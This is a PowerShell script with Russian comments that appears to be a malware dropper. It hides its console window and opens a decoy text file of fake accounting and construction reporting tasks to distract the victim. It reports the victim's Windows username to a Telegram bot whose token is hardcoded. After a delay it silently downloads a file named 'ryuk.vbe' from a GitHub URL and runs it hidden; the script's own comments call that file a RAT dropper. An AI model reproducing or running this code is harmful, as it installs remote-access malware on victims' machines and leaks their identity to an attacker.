# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "Задание_для_бухгалтера_02отдела.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Задание_для_сотрудника:

Задание 1: Перенос данных в таблицу
    Откройте Список_материалов.txt.
    Создайте новый файл Материалы_отсортированные.xlsx.
    Перенесите все данные из текстового файла в таблицу, создав колонки: Наименование, Количество, Ед_изм, Стоимость_за_ед, Поставщик.
    Отсортируйте данные по столбцу Поставщик в алфавитном порядке.
    Сохраните файл.

Задание 2: Проверка и редактирование ведомости
    Откройте Ведомость_выполненных_работ.xlsx.
    Проверьте каждую запись на соответствие формату:
        Дата выполнения должна быть в формате ДД.ММ.ГГГГ.
        Количество должно быть числом больше 0.
    Исправьте ошибки, если найдёте.
    Добавьте новую колонку Примечания и для строк, где Количество > 100, напишите "Большой объем".
    Сохраните файл.

Задание 3: Создание отчетного документа
    Используйте данные из Акты_приемки.txt и Сотрудники_строители.xlsx.
    Создайте новый файл Отчет_по_актам.docx.
    Создайте таблицу с колонками: Номер акта, Дата, Объект, Сумма, Статус, Ответственный
    Перенесите данные из Акты_приемки.txt.
    Для каждого акта в колонке Ответственный укажите "ответственного из файла Сотрудники_строители.docx".
    Отсортируйте данные по Дате (от новых к старым).
    Сохраните файл.

Задание 4: Сводная таблица по поставщикам
    Откройте файл Материалы_отсортированные.xlsx.
    Создайте на новом листе сводную таблицу.
    В строках укажите Поставщик, в столбцах — Наименование, а в значениях — сумму по колонке Стоимостьзаед × Количество (итоговая стоимость).
    Добавьте фильтр по колонке Ед_изм.
    Сохраните изменения в том же файле.

Задание 5: Финальный отчет для руководства
    Используйте файлы Ведомостьвыполненныхработ.xlsx и Отчетпоактам.docx.
    Создайте новый документ Финальный_отчет_17.10.2025.docx.
    В начале документа добавьте титульный лист с названием: «Финальный отчет по строительным работам» и датой 17.10.2025.
    Вставьте таблицу с итоговыми данными:
        Общее количество выполненных работ.
        Общая сумма по актам.
        Количество актов со статусом «Не закрыт».
    В конце документа добавьте раздел «Комментарии», где укажите:
        Если есть строки с пометкой «Большой объем» — перечислите их номера.
        Если есть акты без ответственного — укажите их номера.
    Сохраните файл.

Дополнительное указание:
    Все итоговые файлы сохраните в папку Отчет_на_17.10.2025 и отправьте архивом .rar.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit